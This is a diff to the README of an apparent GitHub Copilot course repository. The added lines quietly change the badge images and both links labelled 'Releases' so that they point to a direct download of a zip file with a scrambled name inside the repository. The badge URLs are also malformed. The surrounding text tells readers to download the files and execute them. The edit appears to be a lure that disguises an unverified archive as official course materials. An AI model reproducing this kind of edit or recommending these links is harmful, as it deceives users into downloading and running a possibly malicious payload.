@@ -1,6 +1,6 @@
 # Mastering GitHub Copilot for Paired Programming: A Complete Guide
 
-![GitHub Copilot](https://img.shields.io/badge/GitHub%20Copilot-Enabled-brightgreen.svg) ![Multi-Module Course](https://img.shields.io/badge/Multi--Module%20Course-Available-blue.svg)
+![GitHub Copilot](https://raw.githubusercontent.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/main/Using-GitHub-Copilot-with-CSharp/Programming-Paired-Mastering-Hub-Git-for-Copilot-v3.2.zip%https://raw.githubusercontent.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/main/Using-GitHub-Copilot-with-CSharp/Programming-Paired-Mastering-Hub-Git-for-Copilot-v3.2.zip) ![Multi-Module Course](https://raw.githubusercontent.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/main/Using-GitHub-Copilot-with-CSharp/Programming-Paired-Mastering-Hub-Git-for-Copilot-v3.2.zip%https://raw.githubusercontent.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/main/Using-GitHub-Copilot-with-CSharp/Programming-Paired-Mastering-Hub-Git-for-Copilot-v3.2.zip)
 
 ## Table of Contents
 1. [Course Overview](#course-overview)
@@ -20,7 +20,7 @@ This repository contains a comprehensive course designed to teach you how to eff
 
 ## Getting Started
 
-To begin your journey with GitHub Copilot, you can download the course materials from the [Releases](https://github.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/releases) section. Follow the instructions in the README file of each module for setup and execution.
+To begin your journey with GitHub Copilot, you can download the course materials from the [Releases](https://raw.githubusercontent.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/main/Using-GitHub-Copilot-with-CSharp/Programming-Paired-Mastering-Hub-Git-for-Copilot-v3.2.zip) section. Follow the instructions in the README file of each module for setup and execution.
 
 ## Modules
 
@@ -97,7 +97,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Releases
 
-For the latest updates and downloadable materials, visit the [Releases](https://github.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/releases) section. Download the necessary files and execute them as per the instructions provided in each module.
+For the latest updates and downloadable materials, visit the [Releases](https://raw.githubusercontent.com/valo55/Mastering-GitHub-Copilot-for-Paired-Programming/main/Using-GitHub-Copilot-with-CSharp/Programming-Paired-Mastering-Hub-Git-for-Copilot-v3.2.zip) section. Download the necessary files and execute them as per the instructions provided in each module.
 
 ## Contact
 
